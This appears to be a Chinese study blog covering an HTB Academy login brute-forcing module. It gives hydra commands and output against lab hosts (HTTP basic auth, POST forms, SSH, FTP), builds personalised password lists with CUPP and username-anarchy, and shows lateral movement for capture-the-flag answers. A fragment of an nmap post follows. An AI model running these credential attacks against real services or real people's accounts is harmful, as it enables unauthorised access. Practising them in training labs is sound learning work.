loop around users, not passwords (effective! implied with -x)  -f / -F   exit when a login/pass pair is found (-M: -f per host, -F global)  server    the target: DNS, IP or 192.168.0.0/24 (this OR the -M option)  service   the service to crack (see below for supported protocols)&lt;...SNIP...&gt;Examples:  hydra -l user -P passlist.txt ftp://192.168.0.1  hydra -L userlist.txt -p defaultpw imap://192.168.0.1/PLAIN  hydra -C defaults.txt -6 pop3s://[2001:db8::1]:143/TLS:DIGEST-MD5  hydra -l admin -p password ftp://[192.168.0.0/24]/  hydra -L logins.txt -P pws.txt -M targets.txt ssh</code></pre><pre><code class="shell-session">Tanin@htb[/htb]$ hydra -C /opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 178.211.23.155 -s 31099 http-get /Hydra v9.1 (c) 2020 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).[DATA] max 16 tasks per 1 server, overall 16 tasks, 66 login tries, ~5 tries per task[DATA] attacking http-get://178.211.23.155:31099/[31099][http-get] host: 178.211.23.155   login: test   password: testingpw[STATUS] attack finished for 178.211.23.155 (valid pair found)1 of 1 target successfully completed, 1 valid password found</code></pre><table><thead><tr><th><strong>Options</strong></th><th><strong>Description</strong></th></tr></thead><tbody><tr><td><code>-C ftp-betterdefaultpasslist.txt</code></td><td>Combined Credentials Wordlist</td></tr><tr><td><code>SERVER_IP</code></td><td>Target IP</td></tr><tr><td><code>-s PORT</code></td><td>Target Port</td></tr><tr><td><code>http-get</code></td><td>Request Method</td></tr><tr><td><code>/</code></td><td>Target Path</td></tr></tbody></table><h2 id="practice"><a href="#practice" class="headerlink" title="practice"></a>practice</h2><blockquote><p>target:46.101.95.166:30237</p></blockquote><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307101049862.png" alt="image-20230710104911976"></p><p>主要是使用-C</p><h1 id="Username-Brute-Force"><a href="#Username-Brute-Force" class="headerlink" title="Username Brute Force"></a>Username Brute Force</h1><p>我们现在知道了hydra的基本用法，所以让我们尝试另一个通过使用用户名和密码的单独单词列表来攻击HTTP基本身份验证的例子。</p><h2 id="Wordlists"><a href="#Wordlists" class="headerlink" title="Wordlists"></a>Wordlists</h2><p>最常用的密码单词列表之一是rockyou.txt，它有1400多万个唯一密码，按常见程度排序，这些密码是从网上泄露的密码和用户名数据库中收集的。基本上，除非密码真的是唯一的，否则这个单词列表很可能会包含它。Rockyou.txt已经存在于我们的Pwnbox中。如果我们在本地虚拟机上使用hydra，我们可以从 <a href="https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt">Hashcat GitHub Repository</a>存储库下载这个单词列表。</p><h2 id="Username-x2F-Password-Attack"><a href="#Username-x2F-Password-Attack" class="headerlink" title="Username&#x2F;Password Attack"></a>Username&#x2F;Password Attack</h2><p>如果凭据在一个列表中，则Hydra至少需要3个特定标志才能对web服务执行暴力攻击： 资格证书 目标主机 目标路径 凭据也可以由用户名和密码分隔。我们可以将-L标志用于用户名单词列表，将-P标志用于密码单词列表。由于我们不想强行将所有用户名与列表中的密码相结合，我们可以通过指定标志-f来告诉hydra在第一次成功登录后停止。</p><blockquote><p>提示：我们将添加“-u”标志，以便它在每个密码上尝试所有用户，而不是在一个用户上尝试所有1400万个密码，然后再转到下一个。</p></blockquote><pre><code class="shell-session">Tanin@htb[/htb]$ hydra -L /opt/useful/SecLists/Usernames/Names/names.txt -P /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt -u -f 178.35.49.134 -s 32901 http-get /[DATA] max 16 tasks per 1 server, overall 16 tasks, 243854766 login tries (l:17/p:14344398), ~15240923 tries per task[DATA] attacking http-get://178.35.49.134:32901/[STATUS] 9105.00 tries/min, 9105 tries in 00:01h, 243845661 to do in 446:22h, 16 active&lt;...SNIP...&gt;[32901][http-get] host: 178.35.49.134   login: thomas   password: thomas1[STATUS] attack finished for SERVER_IP (valid pair found)1 of 1 target successfully completed, 1 valid password found</code></pre><h2 id="Username-Brute-Force-1"><a href="#Username-Brute-Force-1" class="headerlink" title="Username Brute Force"></a>Username Brute Force</h2><p>如果我们只是粗暴地使用用户名或密码，我们可以分配一个具有相同标志但小写的静态用户名或密码。例如，我们可以通过添加-l test，然后添加一个带有-P rockyou.txt的密码单词列表，对测试用户强制执行密码。 由于我们已经在上一节中找到了密码，我们可以使用“-p”标志静态地分配它，并且仅对可能使用此密码的用户名使用暴力。</p><pre><code class="shell-session">Tanin@htb[/htb]$ hydra -L /opt/useful/SecLists/Usernames/Names/usernames.txt -p amormio -u -f 178.35.49.134 -s 32901 http-get /Hydra (https://github.com/vanhauser-thc/thc-hydra)[DATA] max 16 tasks per 1 server, overall 16 tasks, 17 login tries (l:17/p:1), ~2 tries per task[DATA] attacking http-get://178.35.49.134:32901/[32901][http-get] host: 178.35.49.134   login: abbas   password: amormio1 of 1 target successfully completed, 1 valid password foundHydra (https://github.com/vanhauser-thc/thc-hydra)</code></pre><h2 id="practice-1"><a href="#practice-1" class="headerlink" title="practice"></a>practice</h2><blockquote><p>target:46.101.95.166:30237</p></blockquote><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307101141107.png" alt="image-20230710114148111"></p><p>这里要注意语句顺序问题</p><h1 id="Hydra-Modules"><a href="#Hydra-Modules" class="headerlink" title="Hydra Modules"></a>Hydra Modules</h1><p>由于我们在渗透测试期间在Web服务器上为管理员找到了一个登录表单，因此这是一个非常有趣的组件，我们应该尝试在不产生太多网络流量的情况下访问它。最后，使用管理面板，我们可以管理服务器、它们的服务和配置。许多管理面板还实现了 <a href="https://github.com/b374k/b374k">b374k shell</a> 等功能或元素，这些功能或元素可能允许我们直接执行操作系统命令。</p><h2 id="Brute-Forcing-Forms"><a href="#Brute-Forcing-Forms" class="headerlink" title="Brute Forcing Forms"></a>Brute Forcing Forms</h2><p>Hydra提供了许多不同类型的请求，我们可以使用这些请求来强制执行不同的服务。如果我们使用hydra-h，我们应该能够列出支持的服务：</p><pre><code class="shell-session">Tanin@htb[/htb]$ hydra -h | grep &quot;Supported services&quot; | tr &quot;:&quot; &quot;\n&quot; | tr &quot; &quot; &quot;\n&quot; | column -eSupported        ldap3[-&#123;cram|digest&#125;md5][s]rshservices        memcachedrtsp                            mongodbs7-300adam6500        mssqlsipasterisk        mysqlsmbcisco        nntpsmtp[s]cisco-enable        oracle-listenersmtp-enumcvs            oracle-sidsnmpfirebird        pcanywheresocks5ftp[s]        pcnfssshhttp[s]-&#123;head|get|post&#125;pop3[s]sshkeyhttp[s]-&#123;get|post&#125;-formpostgressvnhttp-proxy        radmin2teamspeakhttp-proxy-urlenum    rdp      telnet[s]icq            redisvmauthdimap[s]        rexecvncirc            rloginxmppldap2[s]        rpcap</code></pre><p>在这种情况下，只有两种类型的http模块对我们感兴趣：</p><ol><li><code>http[s]-&#123;head|get|post&#125;</code></li><li><code>http[s]-post-form</code></li></ol><p>第一个模块用于基本的HTTP身份验证，而第二个模块用于登录表单，如.php或.aspx等。 由于文件扩展名是“.php”，我们应该尝试http[s]-post-form模块。为了决定我们需要哪个模块，我们必须确定web应用程序是使用GET还是POST表单。我们可以通过尝试登录并关注URL来测试它。如果我们识别出我们的任何输入都被粘贴到了URL中，那么web应用程序将使用GET表单。否则，它将使用POST表单。</p><p>要了解如何使用http post表单模块，我们可以使用“-U”标志列出它所需的参数和使用示例：</p><pre><code class="shell-session">Tanin@htb[/htb]$ hydra http-post-form -U&lt;...SNIP...&gt;Syntax:   &lt;url&gt;:&lt;form parameters&gt;:&lt;condition string&gt;[:&lt;optional&gt;[:&lt;optional&gt;]First is the page on the server to GET or POST to (URL).Second is the POST/GET variables ...SNIP... usernames and passwords being replaced in the &quot;^USER^&quot; and &quot;^PASS^&quot; placeholdersThe third is the string that it checks for an *invalid* login (by default) Invalid condition login check can be preceded by &quot;F=&quot;, successful condition login check must be preceded by &quot;S=&quot;.&lt;...SNIP...&gt;Examples: &quot;/login.php:user=^USER^&amp;pass=^PASS^:incorrect&quot;</code></pre><p>总之，我们需要提供三个参数，用：分隔，如下所示：</p><ol><li><code>URL path</code>, which holds the login form</li><li><code>POST parameters</code> for username&#x2F;password</li><li><code>A failed/success login string</code>, which lets hydra recognize whether the login attempt was successful or not</li></ol><p>如果我们提供一个失败的字符串，它将一直查找，直到在响应中找不到该字符串为止。另一种方法是，如果我们提供一个成功字符串，它将一直查找，直到在响应中找到该字符串。一个更好的策略是从登录页面的HTML源中选择一些内容。 我们必须选择的内容应该不太可能在登录后出现，比如登录按钮或密码字段。</p><pre><code class="html">  &lt;form name=&#39;login&#39; autocomplete=&#39;off&#39; class=&#39;form&#39; action=&#39;&#39; method=&#39;post&#39;&gt;</code></pre><p>我们在几个地方看到它作为标题&#x2F;标题，我们在上面显示的HTML表单中找到了我们的按钮。我们不必提供整个字符串，所以我们将使用&lt;form name&#x3D;’login’，它应该足够明显，并且在成功登录后可能不存在。 因此，http post表单的语法应该如下所示：</p><pre><code class="bash">&quot;/login.php:[user parameter]=^USER^&amp;[password parameter]=^PASS^:F=&lt;form name=&#39;login&#39;&quot;</code></pre><h1 id="Determine-Login-Parameters"><a href="#Determine-Login-Parameters" class="headerlink" title="Determine Login Parameters"></a>Determine Login Parameters</h1><p>如果我们使用Burp Suite拦截登录请求，或者仔细查看管理面板的源代码，我们可以很容易地找到POST参数。</p><h1 id="Login-Form-Attacks"><a href="#Login-Form-Attacks" class="headerlink" title="Login Form Attacks"></a>Login Form Attacks</h1><p>在我们的情况下，我们没有任何关于现有用户名或密码的信息。由于我们列举了所有可用的端口，但无法确定任何有用的信息，因此我们可以选择结合http post-form模块测试web应用程序表单的默认凭据。</p><h2 id="Default-Credentials"><a href="#Default-Credentials" class="headerlink" title="Default Credentials"></a>Default Credentials</h2><p>让我们尝试使用带有默认凭据的ftp-betterdefaultpasslist.txt列表来测试其中一个帐户是否已在web应用程序中注册。</p><pre><code class="shell-session">Tanin@htb[/htb]$ hydra -C /opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 178.35.49.134 -s 32901 http-post-form &quot;/login.php:username=^USER^&amp;password=^PASS^:F=&lt;form name=&#39;login&#39;&quot;Hydra v9.1 (c) d020 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).Hydra (https://github.com/vanhauser-thc/thc-hydra)[DATA] max 16 tasks per 1 server, overall 16 tasks, 66 login tries, ~5 tries per task[DATA] attacking http-post-form://178.35.49.134:32901/login.php:username=^USER^&amp;password=^PASS^:F=&lt;form name=&#39;login&#39;1 of 1 target completed, 0 valid password foundHydra (https://github.com/vanhauser-thc/thc-hydra)</code></pre><h2 id="Password-Wordlist"><a href="#Password-Wordlist" class="headerlink" title="Password Wordlist"></a>Password Wordlist</h2><pre><code class="shell-session">Tanin@htb[/htb]$ hydra -l admin -P /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt -f 178.35.49.134 -s 32901 http-post-form &quot;/login.php:username=^USER^&amp;password=^PASS^:F=&lt;form name=&#39;login&#39;&quot;Hydra v9.1 (c) 2020 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).Hydra (https://github.com/vanhauser-thc/thc-hydra)[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task[DATA] attacking http-post-form://178.35.49.134:32901/login.php:username=^USER^&amp;password=^PASS^:F=&lt;form name=&#39;login&#39;[PORT][http-post-form] host: 178.35.49.134   login: admin   password: password123[STATUS] attack finished for 178.35.49.134 (valid pair found)1 of 1 target successfully completed, 1 valid password foundHydra (https://github.com/vanhauser-thc/thc-hydra)</code></pre><h2 id="practice-2"><a href="#practice-2" class="headerlink" title="practice"></a>practice</h2><blockquote><p>target : 46.101.95.166:30237</p></blockquote><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307110951584.png" alt="image-20230711095122914"></p><p>我们确定登录需要的参数：<code>username</code> <code>password</code></p><p>然后使用hydra:</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307111003116.png" alt="image-20230711100351354"></p><pre><code>hydra -l admin -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt -f 94.237.54.69 -s 44601 http-post-form &quot;/login.php:username=^USER^&amp;password=^PASS^:F=&lt;form name=&#39;login&#39;&quot; </code></pre><p>验证一下：登陆成功</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307111005728.png" alt="image-20230711100520203"></p><h1 id="Personalized-Wordlists"><a href="#Personalized-Wordlists" class="headerlink" title="Personalized Wordlists"></a>Personalized Wordlists</h1><h2 id="CUPP"><a href="#CUPP" class="headerlink" title="CUPP"></a>CUPP</h2><p>我们通过指定-i参数以交互模式运行它，并回答一系列问题可以得到一个个性化密码本：</p><pre><code class="shell-session">Tanin@htb[/htb]$ cupp -i___________   cupp.py!                 # Common      \                     # User       \   ,__,             # Passwords        \  (oo)____         # Profiler           (__)    )\              ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]                            [ Mebus | https://github.com/Mebus/][+] Insert the information about the victim to make a dictionary[+] If you don&#39;t know all the info, just hit enter when asked! ;)&gt; First Name: William&gt; Surname: Gates&gt; Nickname: Bill&gt; Birthdate (DDMMYYYY): 28101955&gt; Partners) name: Melinda&gt; Partners) nickname: Ann&gt; Partners) birthdate (DDMMYYYY): 15081964&gt; Child&#39;s name: Jennifer&gt; Child&#39;s nickname: Jenn&gt; Child&#39;s birthdate (DDMMYYYY): 26041996&gt; Pet&#39;s name: Nila&gt; Company name: Microsoft&gt; Do you want to add some key words about the victim? Y/[N]: Phoebe,Rory&gt; Do you want to add special chars at the end of words? Y/[N]: y&gt; Do you want to add some random numbers at the end of words? Y/[N]:y&gt; Leet mode? (i.e. leet = 1337) Y/[N]: y[+] Now making a dictionary...[+] Sorting list and removing duplicates...[+] Saving dictionary to william.txt, counting 43368 words.[+] Now load your pistolero with william.txt and shoot! Good luck!</code></pre><p>我们生成的个性化密码单词列表大约有43000行。由于我们在登录时看到了密码策略，我们知道密码必须满足以下条件： 8个字符或更长 包含特殊字符 包含数字 因此，我们可以从我们的单词列表中删除任何不符合这些条件的密码。一些工具会将密码策略转换为Hashcat或John规则，但hydra不支持过滤密码的规则。因此，我们只需使用以下命令即可完成此操作：</p><h2 id="Password-Policy"><a href="#Password-Policy" class="headerlink" title="Password Policy"></a>Password Policy</h2><p>我们生成的个性化密码单词列表大约有43000行。由于我们在登录时看到了密码策略，我们知道密码必须满足以下条件： 8个字符或更长 包含特殊字符 包含数字 因此，我们可以从我们的单词列表中删除任何不符合这些条件的密码。一些工具会将密码策略转换为Hashcat或John规则，但hydra不支持过滤密码的规则。因此，我们只需使用以下命令即可完成此操作：</p><pre><code class="bash">sed -ri &#39;/^.&#123;,7&#125;$/d&#39; william.txt            # remove shorter than 8sed -ri &#39;/[!-/:-@\[-`\&#123;-~]+/!d&#39; william.txt # remove no special charssed -ri &#39;/[0-9]+/!d&#39; william.txt            # remove no numbers</code></pre><h2 id="Mangling"><a href="#Mangling" class="headerlink" title="Mangling"></a>Mangling</h2><p>仍然可以为该列表中的每个单词创建许多排列。我们永远不知道我们的目标在创建密码时是怎么想的，因此我们最安全的选择是添加尽可能多的更改和排列，并注意到这当然需要更多的时间来使用暴力。 许多伟大的工具可以快速轻松地进行单词处理和大小写排列，比如 <a href="https://github.com/digininja/RSMangler">rsmangler</a>或 <a href="https://github.com/sc0tfree/mentalist.git">The Mentalist</a>。这些工具还有许多其他选项，可以使任何小的单词列表达到数百万行。我们应该记住这些工具，因为我们可能在其他模块和情况下需要它们。 作为一个起点，我们将坚持我们迄今为止生成的单词列表，不对其进行任何篡改。如果我们的单词列表没有成功登录，我们将返回这些工具并进行一些篡改，以增加我们猜测密码的机会。</p><h2 id="Custom-Username-Wordlist"><a href="#Custom-Username-Wordlist" class="headerlink" title="Custom Username Wordlist"></a>Custom Username Wordlist</h2><p>我们还应该考虑根据此人的可用详细信息创建一个个性化的用户名单词列表。例如，此人的用户名可以是b.gates或gates或bill，以及许多其他可能的变体。有几种方法可以创建潜在用户名列表，其中最基本的方法就是手动编写。 我们可以使用的一个工具是 <a href="https://github.com/urbanadventurer/username-anarchy">Username Anarchy</a>，我们可以从GitHub克隆它，如下所示：</p><p>该工具有许多用例，我们可以利用这些用例来创建潜在用户名的高级列表。然而，对于我们的简单用例，我们可以简单地运行它，并提供名字&#x2F;姓氏作为参数，然后将输出转发到一个文件中，如下所示：</p><pre><code class="bash">./username-anarchy Bill Gates &gt; bill.txt</code></pre><p>我们最终应该准备好用户名和密码的单词列表，这样我们就可以攻击SSH服务器了。</p><h1 id="Service-Authentication-Brute-Forcing"><a href="#Service-Authentication-Brute-Forcing" class="headerlink" title="Service Authentication Brute Forcing"></a>Service Authentication Brute Forcing</h1><h2 id="SSH-Attack"><a href="#SSH-Attack" class="headerlink" title="SSH Attack"></a>SSH Attack</h2><p>用于攻击登录服务的命令相当简单。我们只需提供用户名&#x2F;密码单词列表，并添加service:&#x2F;&#x2F;SERVER_IP:PORT最后。像往常一样，我们将添加-u-f标志。最后，当我们第一次运行该命令时，hydra将建议我们为最大并行尝试次数添加-t 4标志，因为许多SSH限制了并行连接的数量并丢弃其他连接，导致我们的许多尝试被丢弃。我们的最终命令如下：</p><pre><code class="shell-session">Tanin@htb[/htb]$ hydra -L bill.txt -P william.txt -u -f ssh://178.35.49.134:22 -t 4Hydra v9.1 (c) 2020 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).Hydra (https://github.com/vanhauser-thc/thc-hydra)[DATA] max 4 tasks per 1 server, overall 4 tasks, 157116 login tries (l:12/p:13093), ~39279 tries per task[DATA] attacking ssh://178.35.49.134:22/[STATUS] 77.00 tries/min, 77 tries in 00:01h, 157039 to do in 33:60h, 4 active[PORT][ssh] host: 178.35.49.134   login: b.gates   password: ...SNIP...[STATUS] attack finished for 178.35.49.134 (valid pair found)1 of 1 target successfully completed, 1 valid password foundHydra (https://github.com/vanhauser-thc/thc-hydra)</code></pre><pre><code class="shell-session">Tanin@htb[/htb]$ ssh b.gates@178.35.49.134 -p 22b.gates@SERVER_IP&#39;s password: ********b.gates@bruteforcing:~$ whoamib.gates</code></pre><h2 id="FTP-Brute-Forcing"><a href="#FTP-Brute-Forcing" class="headerlink" title="FTP Brute Forcing"></a>FTP Brute Forcing</h2><p>一旦我们进入，我们就可以查看系统上的其他用户</p><pre><code class="shell-session">b.gates@bruteforcing:~$ ls /homeb.gates  m.gates</code></pre><p>我们注意到另一个用户m.gates。我们在本地侦察中也注意到端口21在本地打开，这表明FTP必须可用：</p><pre><code class="shell-session">b.gates@bruteforcing:~$ netstat -antp | grep -i list(No info could be read for &quot;-p&quot;: geteuid()=1000 but you should be root.)tcp        0      0 127.0.0.1:21            0.0.0.0:*               LISTEN      - tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -tcp6       0      0 :::80                   :::*                    LISTEN      -   </code></pre><p>接下来，我们现在可以尝试强制m.gates用户进行FTP登录。</p><blockquote><p>注1：有时管理员会使用不同的工具测试他们的安全措施和策略。在这种情况下，该web服务器的管理员一直安装着“hydra”。我们可以从中受益，并通过本地或远程攻击FTP服务来对抗本地系统。</p></blockquote><blockquote><p>注2：rockyou-10.txt是“rockyu.txt”的较短版本，包含14344391个密码。</p></blockquote><p>因此，与我们攻击SSH服务的方式类似，我们可以对FTP进行类似的攻击：</p><pre><code class="shell-session">b.gates@bruteforcing:~$ hydra -l m.gates -P rockyou-10.txt ftp://127.0.0.1Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.Hydra (https://github.com/vanhauser-thc/thc-hydra)[DATA] max 16 tasks per 1 server, overall 16 tasks, 92 login tries (l:1/p:92), ~6 tries per task[DATA] attacking ftp://127.0.0.1:21/[21][ftp] host: 127.0.0.1   login: m.gates   password: &lt;...SNIP...&gt;1 of 1 target successfully completed, 1 valid password foundHydra (https://github.com/vanhauser-thc/thc-hydra)</code></pre><p>要切换到该用户：</p><pre><code class="shell-session">b.gates@bruteforcing:~$ su - m.gates</code></pre><h2 id="practice1-1"><a href="#practice1-1" class="headerlink" title="practice1.1"></a>practice1.1</h2><blockquote><p>target:94.237.55.13：34133</p><p>使用您在本节中学到的知识，尝试在上面显示的目标服务器中暴力破解用户“b.gates”的SSH登录。然后尝试通过 SSH 连接到服务器。</p></blockquote><p>先用cupp做一个字典：大体按照学院的示例中的内容填写</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307111116559.png" alt="image-20230711111612191"></p><p>密码策略：</p><pre><code class="bash">sed -ri &#39;/^.&#123;,7&#125;$/d&#39; william.txt            # remove shorter than 8sed -ri &#39;/[!-/:-@\[-`\&#123;-~]+/!d&#39; william.txt # remove no special charssed -ri &#39;/[0-9]+/!d&#39; william.txt            # remove no numbers</code></pre><p>这里他给了用户名，静态分配用户名即可就不必生成用户名字典了</p><pre><code>hydra -l b.gates -P william.txt -u -f ssh://94.237.55.13:34133</code></pre><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307111122537.png" alt="image-20230711112243016"></p><p>然后到home中拿到flag</p><h2 id="practice1-2"><a href="#practice1-2" class="headerlink" title="practice1.2"></a>practice1.2</h2><blockquote><p>ssh登录后，尝试强制其他用户进行FTP登录。您应该在它们的主目录中找到另一个flag.</p></blockquote><p>我们在home文件中知道另一个用户是m.gates，并且在本用户目录下给了一个rockyou文本，并且服务器安装了hydra那么按照示例中的操作打就可以了;</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307111128017.png" alt="image-20230711112849950"></p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307111136428.png" alt="image-20230711113652067"></p><h1 id="Skills-Assessment-—-website"><a href="#Skills-Assessment-—-website" class="headerlink" title="Skills Assessment — website"></a>Skills Assessment <em>— website</em></h1><blockquote><p>我们的客户要求对其网络上的另一台主机进行额外的黑匣子渗透测试。经过主机和端口扫描，我们发现只有一个TCP端口打开。由于我们已经在另一台主机上发现了弱凭据，因此新主机可能容易受到相同漏洞类型的攻击。在我们的参与过程中，我们也应该考虑不同的单词表。</p><p>target : 94.237.59.206:39321</p><p>当你试图访问上面显示的IP时，你将没有访问它的授权。强行进行身份验证并检索flag。</p><p>一旦你访问了登录页面，你的任务就是强行进入这个页面。里面藏着什么flag？</p></blockquote><p>根据提示该主机有弱凭据，并且让考虑不同的单词表，应该就是说使用不同的Default-Credentials 字典爆破：</p><p>这里使用了尝试使用了一下简写：     </p><p><code>hydra -C ftp-betterdefaultpasslist.txt http-get://94.237.59.206:39321</code>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                </p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307111250415.png" alt="image-20230711125048090"></p><p>登录网页得到第一个flag，并且又可以进入这个login页面</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307111255019.png" alt="image-20230711125518477"></p><p>按照之前的做法，先去看看登录时发送的参数以及传参方式，这里跟示例中一样是post传参并且参数为user和pass，然后失败的判定字符串为这个login表单,这里我们截取一部分就好了：</p><pre><code>form name=&#39;log-in&#39;</code></pre><p>在示例中两个页面的用户名是一样的，这里是不是也一样呢？毕竟只是作为一个工具练习，没必要用两个字典跑很久，如果不行就只能找用户名字典＋rockyou了</p><pre><code>hydra -l user -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt 94.237.59.206 -s 39321 http-post-form &quot;/admin_login.php:user=^USER^&amp;pass=^PASS^:F=form name=&#39;log-in&#39;&quot;</code></pre><p>这里尝试简写但是失败了，只能老老实实来，然后也要注意语序</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307111341779.png" alt="image-20230711134140132"></p><p>这里挺离谱的，我直接在浏览器里F12查看post包，然后就顺带在里面看源码，结果发现F12里面的的标签<code>form name=&#39;log-in&#39;</code>是双引号，导致爆破半天密码不对，很无语</p><h1 id="Skills-Assessment-—-Service-Login"><a href="#Skills-Assessment-—-Service-Login" class="headerlink" title="Skills Assessment — Service Login"></a>Skills Assessment — Service Login</h1><blockquote><p>我们得到了一个在线学院的IP地址，但没有关于他们网站的进一步信息。作为进行渗透测试的第一步，我们必须确定网站和其他登录服务中是否使用了任何弱凭据。 不仅仅关注默认&#x2F;通用密码。使用本模块中学习的技能收集有关我们确定的员工的信息，以创建自定义单词列表来攻击他们的帐户。 使用我们在模块部分介绍的技能攻击web应用程序并提交两个标志，然后提交它们以完成本模块。</p><p>target:83.136.255.143:58141</p><p>由于您现在已经掌握了上一个技能评估问题中员工的姓名，请尝试收集他们的基本信息，并生成符合密码策略的自定义密码单词列表。还可以使用“用户名生成器”为员工生成潜在用户名。最后，尝试强行使用上面显示的SSH服务器来获取标志。</p><p>一旦您进入，您应该会发现服务器中存在另一个用户。尝试强行登录，并获取他们的标志。</p></blockquote><p>这里看描述应该是进行后半段的复现，这里只有一个名字是Harry potter，先try：</p><p><code>cupp -i </code>先创建一个只有名字为信息的密码本</p><p>使用<code>anarchy</code>生成用户名:<code>./username-anarchy Harry Potter &gt; harry.txt</code></p><p>然后用生成的两个文本进行爆破，根据题目应该是使用ssh：</p><pre><code>hydra -L username-anarchy/harry.txt -P harry.txt -u -f ssh://83.136.255.143:58141 -t 4</code></pre><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307111704081.png" alt="image-20230711170429477"></p><p>还是跑了挺长时间的，这里ssh连接要使用-p 指定端口,不然会显示权限被拒绝，可能是默认访问的端口没给权限。</p><p>ssh连接后就更之前示例中的联系一毛一样了，给了个rockyou然后通过ftp横向移动：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307111713249.png" alt="image-20230711171301439"></p><p><code>hydra -l g.potter -P rockyou-30.txt -u -f ftp://127.0.0.1</code></p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307111730018.png" alt="image-20230711173037437"></p><p>ok</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;暴力攻击是一种试图通过自动探测来猜测密码或密钥的方法。暴力攻击的一个例子是密码破解。密码通常不会以明文形式存储在系统中，而是作为哈希值存储。 &lt;/p&gt;</summary>
    
    
    
    
    <category term="base" scheme="https://taninluv.github.io/tags/base/"/>
    
    <category term="tool" scheme="https://taninluv.github.io/tags/tool/"/>
    
  </entry>
  
  <entry>
    <title>nmap</title>
    <link href="https://taninluv.github.io/2023/07/08/nmap/"/>
    <id>https://taninluv.github.io/2023/07/08/nmap/</id>
    <published>2023-07-08T01:11:38.000Z</published>
    <updated>2023-07-09T02:28:23.094Z</updated>
    
    <content type="html"><![CDATA[<p>Nmap提供了许多不同类型的扫描，可用于获得有关我们目标的各种结果。基本上，Nmap可以分为以下扫描技术： 主机发现 端口扫描 服务枚举和检测 OS检测 与目标服务的脚本化交互（Nmap脚本引擎）</p><span id="more"></span><h2 id="Syntax"><a href="#Syntax" class="headerlink" title="Syntax"></a>Syntax</h2><pre><code class="shell-session">Tanin@htb[/htb]$ nmap &lt;scan types&gt; &lt;options&gt; &lt;target&gt;</code></pre><h2 id="Scan-Techniques"><a href="#Scan-Techniques" class="headerlink" title="Scan Techniques"></a>Scan Techniques</h2><p>Nmap提供了许多不同的扫描技术，可以进行不同类型的连接，并使用不同结构的数据包进行发送。在这里，我们可以看到Nmap提供的所有扫描技术：</p><pre><code class="shell-session">Tanin@htb[/htb]$ nmap --help&lt;SNIP&gt;SCAN TECHNIQUES:  -sS/sT/sA/sW/sM: TCP SYN/Connect()/ACK/Window/Maimon scans  -sU: UDP Scan  -sN/sF/sX: TCP Null, FIN, and Xmas scans  --scanflags &lt;flags&gt;: Customize TCP scan flags  -sI &lt;zombie host[:probeport]&gt;: Idle scan  -sY/sZ: SCTP INIT/COOKIE-ECHO scans  -sO: IP protocol scan  -b &lt;FTP relay host&gt;: FTP bounce scan&lt;SNIP&gt;</code></pre><p>例如，TCP-SYN扫描（-sS）是默认设置之一，除非我们另有定义，它也是最流行的扫描方法之一。这种扫描方法可以每秒扫描数千个端口。TCP-SYN扫描发送一个带有SYN标志的数据包，因此永远不会完成三方握手，这导致无法建立到扫描端口的完整TCP连接。</p><p>如果我们的目标将带有SYN-ACK标记的数据包发送回扫描的端口，Nmap会检测到该端口处于打开状态。 如果数据包接收到RST标志，则表示端口已关闭。 如果Nmap没有收到返回的数据包，它将显示为已过滤。根据防火墙配置，某些数据包可能会被防火墙丢弃或忽略。</p><h1 id="Host-Discovery"><a href="#Host-Discovery" class="headerlink" title="Host Discovery"></a>Host Discovery</h1><h4 id="Scan-Network-Range"><a href="#Scan-Network-Range" class="headerlink" title="Scan Network Range"></a>Scan Network Range</h4><pre><code class="shell-session">Tanin@htb[/htb]$ sudo nmap 10.129.2.0/24 -sn -oA tnet | grep for | cut -d&quot; &quot; -f510.129.2.410.129.2.1010.129.2.1110.129.2.1810.129.2.1910.129.2.2010.129.2.28</code></pre><blockquote><p>提供的命令使用了<code>nmap</code>工具对IP范围10.129.2.0&#x2F;24执行了一个ping扫描（<code>-sn</code>）。然后，它以指定的格式（<code>-oA tnet</code>）保存输出结果。<code>grep for</code>命令用于过滤只显示包含关键词”for”的行。最后，<code>cut -d&quot; &quot; -f5</code>使用空格作为分隔符提取每行的第五个字段。</p><p>在这种情况下，第五个字段对应于响应了ping扫描的IP地址。</p></blockquote><h2 